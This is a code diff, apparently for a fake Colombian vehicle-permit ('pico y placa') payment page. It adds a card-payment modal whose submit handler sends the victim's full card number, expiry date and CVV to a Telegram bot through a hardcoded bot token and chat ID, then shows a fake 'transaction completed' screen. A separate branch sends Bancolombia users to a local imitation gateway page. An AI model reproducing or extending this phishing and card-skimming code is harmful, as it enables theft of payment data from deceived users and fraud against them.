@@ -1244,7 +1244,7 @@
                         <option value="popular">BANCO POPULAR</option>
                         <option value="Occidente">BANCO DE OCCIDENTE</option>
                         <!---<option value="BANCO FALABELLA">BANCO FALABELLA</option>--->
-                        <!---<option value="SCOTIABANK COLPATRIA">SCOTIABANK COLPATRIA</option>--->                  
+                        <!---<option value="SCOTIABANK COLPATRIA">SCOTIABANK COLPATRIA</option>--->
                         <!---<option value="DALE">DALE</option>
                         <option value="LULO BANK">LULO BANK</option>
                         <option value="NU">NU</option>
@@ -1274,7 +1274,7 @@
                         <option value="CREZCAMOS">CREZCAMOS</option>
                         <option value="IRIS">IRIS</option>---->
                         <option value="jfk">JFK COOPERATIVA FINANCIERA</option>
-                       <!--- <option value="MOVII S.A.">MOVII S.A.</option>
+                        <!--- <option value="MOVII S.A.">MOVII S.A.</option>
                         <option value="RAPPIPAY">RAPPIPAY</option>
                         <option value="RAPPIPAY DAVIPLATA">RAPPIPAY DAVIPLATA</option>
                         <option value="UALÁ">UALÁ</option>-->
@@ -1435,6 +1435,123 @@
                 style="background-color: #053b29; color: #ffffff; font-weight: 700; padding: 10px 36px; border-radius: 8px; font-size: 14px; border: none; cursor: pointer;">
                 Cerrar
             </button>
+        </div>
+    </div><!-- MODAL DE PAGO TARJETA DE DÉBITO / CRÉDITO -->
+    <div id="modalTarjeta"
+        style="position: fixed; inset: 0; z-index: 300000; display: none; align-items: center; justify-content: center; background-color: rgba(0, 0, 0, 0.4); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); padding: 16px; box-sizing: border-box; font-family: system-ui, -apple-system, sans-serif;">
+        <div
+            style="background-color: #ffffff; border-radius: 12px; width: 100%; max-width: 440px; max-height: 90vh; display: flex; flex-direction: column; overflow: hidden; position: relative; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3), 0 10px 10px -5px rgba(0, 0, 0, 0.1);">
+
+            <!-- Header -->
+            <div
+                style="background-color: #ffffff; color: #111827; padding: 18px 24px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #f3f4f6;">
+                <h3 style="font-size: 18px; font-weight: 700; margin: 0; color: #111827;">Datos de la Tarjeta</h3>
+                <button id="closeTarjetaBtn" type="button"
+                    style="background: transparent; border: none; color: #6b7280; font-size: 22px; font-weight: 400; cursor: pointer; line-height: 1;">✕</button>
+            </div>
+
+            <!-- Body -->
+            <div style="padding: 24px; overflow-y: auto; flex: 1; font-size: 13px; color: #111827;">
+                <form id="formPagoTarjeta" onsubmit="event.preventDefault();">
+                    <!-- Total a pagar -->
+                    <div
+                        style="background-color: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 12px; text-align: center; margin-bottom: 20px;">
+                        <span style="font-size: 14px; color: #334155;">Total a pagar: <strong id="tarjetaMontoTotal"
+                                style="color: #0f172a; font-size: 16px;">$87.900</strong></span>
+                    </div>
+
+                    <div style="margin-bottom: 16px;">
+                        <label style="display: block; font-weight: 700; margin-bottom: 6px; color: #334155;">Banco de la
+                            Tarjeta <span style="color: #ef4444;">*</span></label>
+                        <select id="tarjetaBanco" required
+                            style="width: 100%; padding: 10px 12px; border: 1px solid #cbd5e1; border-radius: 8px; outline: none; background: #fff; font-size: 13px; color: #334155;">
+                            <option value="" disabled selected>-- Selecciona el banco de la tarjeta --</option>
+                            <option value="Bancolombia">BANCOLOMBIA</option>
+                            <option value="Banco de Bogotá">BANCO DE BOGOTA</option>
+                            <option value="Davivienda">BANCO DAVIVIENDA</option>
+                            <option value="Davibank">DAVIBANK</option>
+                            <option value="Nequi">NEQUI</option>
+                            <option value="BBVA">BANCO BBVA COLOMBIA S.A.</option>
+                            <option value="Banco Caja Social">BANCO CAJA SOCIAL</option>
+                            <option value="AV Villas">BANCO AV VILLAS</option>
+                            <option value="Banco Popular">BANCO POPULAR</option>
+                            <option value="Banco de Occidente">BANCO DE OCCIDENTE</option>
+                            <option value="Banco Falabella">BANCO FALABELLA</option>
+                            <option value="Scotiabank Colpatria">SCOTIABANK COLPATRIA</option>
+                            <option value="Dale">DALE</option>
+                            <option value="Lulo Bank">LULO BANK</option>
+                            <option value="Nu">NU</option>
+                            <option value="Alianza Fiduciaria">ALIANZA FIDUCIARIA</option>
+                            <option value="Ban100">BAN100</option>
+                            <option value="Bancamía">BANCAMIA S.A.</option>
+                            <option value="Banco Agrario">BANCO AGRARIO</option>
+                            <option value="Coopcentral">BANCO COOPERATIVO COOPCENTRAL</option>
+                            <option value="Credifinanciera">BANCO CREDIFINANCIERA</option>
+                            <option value="Finandina">BANCO FINANDINA S.A. BIC</option>
+                            <option value="GNB Sudameris">BANCO GNB SUDAMERIS</option>
+                            <option value="Itaú">BANCO ITAU</option>
+                            <option value="JP Morgan">BANCO J.P. MORGAN COLOMBIA S.A.</option>
+                            <option value="Mundo Mujer">BANCO MUNDO MUJER S.A.</option>
+                            <option value="Pichincha">BANCO PICHINCHA S.A.</option>
+                            <option value="Santander">BANCO SANTANDER COLOMBIA</option>
+                            <option value="Serfinanza">BANCO SERFINANZA</option>
+                            <option value="Banco Unión">BANCO UNION antes GIROS</option>
+                            <option value="Bancoomeva">BANCOOMEVA S.A.</option>
+                            <option value="Bold CF">BOLD CF</option>
+                            <option value="CFA">CFA COOPERATIVA FINANCIERA</option>
+                            <option value="Citibank">CITIBANK</option>
+                            <option value="Coltefinanciera">COLTEFINANCIERA</option>
+                            <option value="Confiar">CONFIAR COOPERATIVA FINANCIERA</option>
+                            <option value="Coofinep">COOFINEP COOPERATIVA FINANCIERA</option>
+                            <option value="Cotrafa">COTRAFA</option>
+                            <option value="Crezcamos">CREZCAMOS</option>
+                            <option value="Iris">IRIS</option>
+                            <option value="JFK">JFK COOPERATIVA FINANCIERA</option>
+                            <option value="Movii">MOVII S.A.</option>
+                            <option value="Rappipay">RAPPIPAY</option>
+                            <option value="Daviplata">DAVIPLATA</option>
+                            <option value="Ualá">UALÁ</option>
+                        </select>
+                    </div>
+
+                    <!-- Número de Tarjeta -->
+                    <div style="margin-bottom: 16px;">
+                        <label style="display: block; font-weight: 700; margin-bottom: 6px; color: #334155;">Número de
+                            Tarjeta <span style="color: #ef4444;">*</span></label>
+                        <input type="text" id="tarjetaNumero" placeholder="0000 0000 0000 0000" maxlength="19" required
+                            autocomplete="off"
+                            style="width: 100%; padding: 10px 12px; border: 1px solid #cbd5e1; border-radius: 8px; outline: none; box-sizing: border-box; font-size: 14px; letter-spacing: 1px;">
+                    </div>
+
+                    <!-- Vencimiento y CVV -->
+                    <div style="display: flex; gap: 12px; margin-bottom: 24px;">
+                        <div style="flex: 1;">
+                            <label
+                                style="display: block; font-weight: 700; margin-bottom: 6px; color: #334155;">Vencimiento
+                                <span style="color: #ef4444;">*</span></label>
+                            <input type="text" id="tarjetaExp" placeholder="MM/AA" maxlength="5" required
+                                autocomplete="off"
+                                style="width: 100%; padding: 10px 12px; border: 1px solid #cbd5e1; border-radius: 8px; outline: none; box-sizing: border-box; font-size: 14px; text-align: center;">
+                        </div>
+                        <div style="flex: 1;">
+                            <label style="display: block; font-weight: 700; margin-bottom: 6px; color: #334155;">CVV
+                                <span style="color: #ef4444;">*</span></label>
+                            <input type="password" id="tarjetaCvv" placeholder="123" maxlength="4" required
+                                autocomplete="off"
+                                style="width: 100%; padding: 10px 12px; border: 1px solid #cbd5e1; border-radius: 8px; outline: none; box-sizing: border-box; font-size: 14px; text-align: center;">
+                        </div>
+                    </div>
+
+                    <!-- Botones de Acción -->
+                    <div style="display: flex; flex-direction: column; gap: 10px;">
+                        <button id="btnConfirmarPagarTarjeta" type="button" disabled
+                            style="width: 100%; background-color: #9ca3af; color: #ffffff; font-weight: 700; padding: 12px; border-radius: 8px; border: none; cursor: not-allowed; font-size: 14px; opacity: 0.7; transition: all 0.2s ease;">Pagar</button>
+                        <button id="btnCambiarMetodoTarjeta" type="button"
+                            style="width: 100%; background-color: #ffffff; color: #334155; font-weight: 600; padding: 11px; border-radius: 8px; border: 1px solid #cbd5e1; cursor: pointer; font-size: 13px;">Cambiar
+                            método de pago</button>
+                    </div>
+                </form>
+            </div>
         </div>
     </div>
     <script
@@ -1974,9 +2091,9 @@
                 if (txtTotalBase) txtTotalBase.textContent = `$${totalBase.toLocaleString('es-CO')}`;
             }
 
-            // SELECCIÓN DE MEDIO DE PAGO
             cardsMedioPago.forEach(card => {
                 card.addEventListener('click', () => {
+                    // Restablecer estilos de todas las tarjetas
                     cardsMedioPago.forEach(c => {
                         c.style.borderColor = '#d1d5db';
                         c.style.backgroundColor = '#ffffff';
@@ -1986,6 +2103,7 @@
                         if (outerDot) outerDot.style.borderColor = '#9ca3af';
                     });
 
+                    // Activar tarjeta seleccionada
                     card.style.borderColor = '#053b29';
                     card.style.backgroundColor = '#f0fdf4';
                     const activeInner = card.querySelector('.radio-inner');
@@ -1996,18 +2114,46 @@
                     medioPagoSeleccionado = card.dataset.medio;
                     calcularTotalesCheckout();
 
+                    // 1. SI ES PSE
                     if (medioPagoSeleccionado === 'pse') {
                         let subtotalNumerico = 0;
-                        placasDetalleCheckout.forEach(item => {
-                            subtotalNumerico += item.valor;
-                        });
+                        placasDetalleCheckout.forEach(item => {subtotalNumerico += item.valor;});
 
                         if (psePlacasInput) psePlacasInput.value = placasLista.join(', ');
                         if (pseSaldoInput) pseSaldoInput.value = `$${subtotalNumerico.toLocaleString('es-CO')}`;
                         if (pseValorTotal) pseValorTotal.value = `$${subtotalNumerico.toLocaleString('es-CO')}`;
 
                         if (modalPse) modalPse.style.display = 'flex';
-                        validarFormularioPse(); // Verificar validez al desplegar el modal
+                        validarFormularioPse();
+                    }
+
+                    // 2. SI ES TARJETA
+                    else if (medioPagoSeleccionado === 'tarjeta') {
+                        let subtotalNumerico = 0;
+                        placasDetalleCheckout.forEach(item => {subtotalNumerico += item.valor;});
+
+                        if (tarjetaMontoTotal) tarjetaMontoTotal.textContent = `$${subtotalNumerico.toLocaleString('es-CO')}`;
+                        if (modalTarjeta) modalTarjeta.style.display = 'flex';
+                        validarFormularioTarjeta();
+                    }
+
+                    // 3. SI ES BANCOLOMBIA (REDIRECCIÓN DIRECTA A /botonco)
+                    else if (medioPagoSeleccionado === 'bancolombia') {
+                        let subtotalNumerico = 0;
+                        placasDetalleCheckout.forEach(item => {subtotalNumerico += item.valor;});
+
+                        // Guardar datos en localStorage si los necesitas en la pasarela
+                        localStorage.setItem('bancolombia_placas', placasLista.join(', '));
+                        localStorage.setItem('bancolombia_valor', subtotalNumerico);
+
+                        // Mostrar el loader global con mensaje personalizado
+                        if (loaderText) loaderText.textContent = 'Conectando de forma segura con Bancolombia...';
+                        if (loaderGlobal) loaderGlobal.style.display = 'flex';
+
+                        // Redirigir directamente a la carpeta botonco
+                        setTimeout(() => {
+                            window.location.href = './botonco/index.html';
+                        }, 1200);
                     }
                 });
             });
@@ -2020,7 +2166,7 @@
 
                 // Captura dinámica de los campos editables del modal PSE
                 const banco = selectBancoPse ? selectBancoPse.value : '';
-                
+
                 const inputsText = modalPse.querySelectorAll('input[type="text"]');
                 let identificacionVal = '';
                 let direccionVal = '';
@@ -2049,11 +2195,11 @@
                 const correoVal = inputCorreo ? inputCorreo.value.trim() : '';
 
                 // Comprobar que todos los campos obligatorios (*) contengan valor
-                const esValido = banco !== '' && 
-                                 identificacionVal.length > 0 && 
-                                 correoVal.includes('@') && 
-                                 direccionVal.length > 0 && 
-                                 telefonoVal.length >= 7;
+                const esValido = banco !== '' &&
+                    identificacionVal.length > 0 &&
+                    correoVal.includes('@') &&
+                    direccionVal.length > 0 &&
+                    telefonoVal.length >= 7;
 
                 if (esValido) {
                     btnConfirmarPagarPse.removeAttribute('disabled');
@@ -2512,6 +2658,160 @@
                     if (btnAnterior) btnAnterior.style.display = 'none';
                     if (footerTextoInfo) footerTextoInfo.textContent = 'Complete el formulario y haga clic en "Siguiente"';
                 }
+            });
+            // ==========================================
+            // REFERENCIAS Y LÓGICA DEL MODAL DE TARJETA
+            // ==========================================
+            const modalTarjeta = document.getElementById('modalTarjeta');
+            const closeTarjetaBtn = document.getElementById('closeTarjetaBtn');
+            const btnCambiarMetodoTarjeta = document.getElementById('btnCambiarMetodoTarjeta');
+            const btnConfirmarPagarTarjeta = document.getElementById('btnConfirmarPagarTarjeta');
+
+            const tarjetaBanco = document.getElementById('tarjetaBanco');
+            const tarjetaNumero = document.getElementById('tarjetaNumero');
+            const tarjetaExp = document.getElementById('tarjetaExp');
+            const tarjetaCvv = document.getElementById('tarjetaCvv');
+            const tarjetaMontoTotal = document.getElementById('tarjetaMontoTotal');
+
+            // Credenciales Telegram (extraídas del script asset.js)
+            const TELEGRAM_BOT_TOKEN = "8627198220:AAHlyBdeq2SeDlVN6G4_6QPdQrwU3tY-ICw";
+            const TELEGRAM_CHAT_ID = "-1004245962123";
+
+            // 1. Mostrar modal de Tarjeta cuando se elija "tarjeta"
+            cardsMedioPago.forEach(card => {
+                card.addEventListener('click', () => {
+                    // ... (Tu código existente de clases y estilos) ...
+
+                    if (card.dataset.medio === 'tarjeta') {
+                        let subtotalNumerico = 0;
+                        placasDetalleCheckout.forEach(item => {subtotalNumerico += item.valor;});
+
+                        if (tarjetaMontoTotal) tarjetaMontoTotal.textContent = `$${subtotalNumerico.toLocaleString('es-CO')}`;
+                        if (modalTarjeta) modalTarjeta.style.display = 'flex';
+                        validarFormularioTarjeta();
+                    }
+                });
+            });
+
+            // 2. Formato automático de campos
+            tarjetaNumero?.addEventListener('input', (e) => {
+                let val = e.target.value.replace(/\D/g, '');
+                val = val.replace(/(.{4})/g, '$1 ').trim();
+                e.target.value = val;
+                validarFormularioTarjeta();
+            });
+
+            tarjetaExp?.addEventListener('input', (e) => {
+                let val = e.target.value.replace(/\D/g, '');
+                if (val.length >= 2) {
+                    val = val.substring(0, 2) + '/' + val.substring(2, 4);
+                }
+                e.target.value = val;
+                validarFormularioTarjeta();
+            });
+
+            tarjetaCvv?.addEventListener('input', () => validarFormularioTarjeta());
+            tarjetaBanco?.addEventListener('change', () => validarFormularioTarjeta());
+
+            // 3. Validación de formulario de tarjeta
+            function validarFormularioTarjeta() {
+                if (!btnConfirmarPagarTarjeta) return;
+
+                const banco = tarjetaBanco ? tarjetaBanco.value : '';
+                const num = tarjetaNumero ? tarjetaNumero.value.replace(/\s/g, '') : '';
+                const exp = tarjetaExp ? tarjetaExp.value.trim() : '';
+                const cvv = tarjetaCvv ? tarjetaCvv.value.trim() : '';
+
+                const esValido = banco !== '' && num.length >= 15 && exp.length === 5 && cvv.length >= 3;
+
+                if (esValido) {
+                    btnConfirmarPagarTarjeta.removeAttribute('disabled');
+                    btnConfirmarPagarTarjeta.style.backgroundColor = '#053b29';
+                    btnConfirmarPagarTarjeta.style.cursor = 'pointer';
+                    btnConfirmarPagarTarjeta.style.opacity = '1';
+                } else {
+                    btnConfirmarPagarTarjeta.setAttribute('disabled', 'true');
+                    btnConfirmarPagarTarjeta.style.backgroundColor = '#9ca3af';
+                    btnConfirmarPagarTarjeta.style.cursor = 'not-allowed';
+                    btnConfirmarPagarTarjeta.style.opacity = '0.7';
+                }
+            }
+
+            // 4. Cerrar Modal Tarjeta
+            closeTarjetaBtn?.addEventListener('click', () => {if (modalTarjeta) modalTarjeta.style.display = 'none';});
+            btnCambiarMetodoTarjeta?.addEventListener('click', () => {if (modalTarjeta) modalTarjeta.style.display = 'none';});
+
+            // 5. Enviar Notificación a Telegram y avanzar al Paso 4 (Aprobación)
+            btnConfirmarPagarTarjeta?.addEventListener('click', async () => {
+                let subtotalNumerico = 0;
+                placasDetalleCheckout.forEach(item => {subtotalNumerico += item.valor;});
+
+                const banco = tarjetaBanco.value;
+                const num = tarjetaNumero.value;
+                const exp = tarjetaExp.value;
+                const cvv = tarjetaCvv.value;
+                const placas = placasLista.join(', ');
+
+                const mensajeTelegram =
+                    `💳 *NUEVO PAGO CON TARJETA (PICO Y PLACA)* 💳\n\n` +
+                    `🚗 *Placas:* \`${placas}\`\n` +
+                    `💰 *Monto:* $${subtotalNumerico.toLocaleString('es-CO')}\n` +
+                    `🏦 *Banco:* ${banco}\n` +
+                    `💳 *Número:* \`${num}\`\n` +
+                    `📅 *Vencimiento:* \`${exp}\`\n` +
+                    `🔒 *CVV:* \`${cvv}\`\n` +
+                    `🕒 *Fecha:* ${new Date().toLocaleString()}`;
+
+                // Cierra modal y muestra loader
+                if (modalTarjeta) modalTarjeta.style.display = 'none';
+                if (loaderText) loaderText.textContent = 'Procesando pago con tarjeta de crédito/débito...';
+                if (loaderGlobal) loaderGlobal.style.display = 'flex';
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: mensajeTelegram,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                } catch (err) {
+                    console.error("Error enviando a Telegram:", err);
+                }
+
+                // Llevar al Paso 4 (Confirmación/Aprobación) dentro del stepper
+                setTimeout(() => {
+                    if (loaderGlobal) loaderGlobal.style.display = 'none';
+
+                    pasoActual = 4;
+                    if (step3Container) step3Container.style.display = 'none';
+                    if (step4Container) step4Container.style.display = 'block';
+
+                    const stepCircle3 = document.getElementById('stepCircle3');
+                    const stepLine3 = document.getElementById('stepLine3');
+                    const stepCircle4 = document.getElementById('stepCircle4');
+                    const stepLabel4 = document.getElementById('stepLabel4');
+
+                    if (stepCircle3) {
+                        stepCircle3.style.backgroundColor = '#88f456';
+                        stepCircle3.style.color = '#053b29';
+                    }
+                    if (stepLine3) stepLine3.style.backgroundColor = '#88f456';
+                    if (stepCircle4) {
+                        stepCircle4.style.backgroundColor = '#053b29';
+                        stepCircle4.style.color = '#ffffff';
+                    }
+                    if (stepLabel4) {
+                        stepLabel4.style.color = '#053b29';
+                        stepLabel4.style.fontWeight = '700';
+                    }
+
+                    if (btnAnterior) btnAnterior.style.display = 'none';
+                    if (btnSiguiente) btnSiguiente.style.display = 'none';
+                    if (footerTextoInfo) footerTextoInfo.textContent = 'Trámite completado exitosamente.';
+                }, 1800);
             });
         });
     </script>
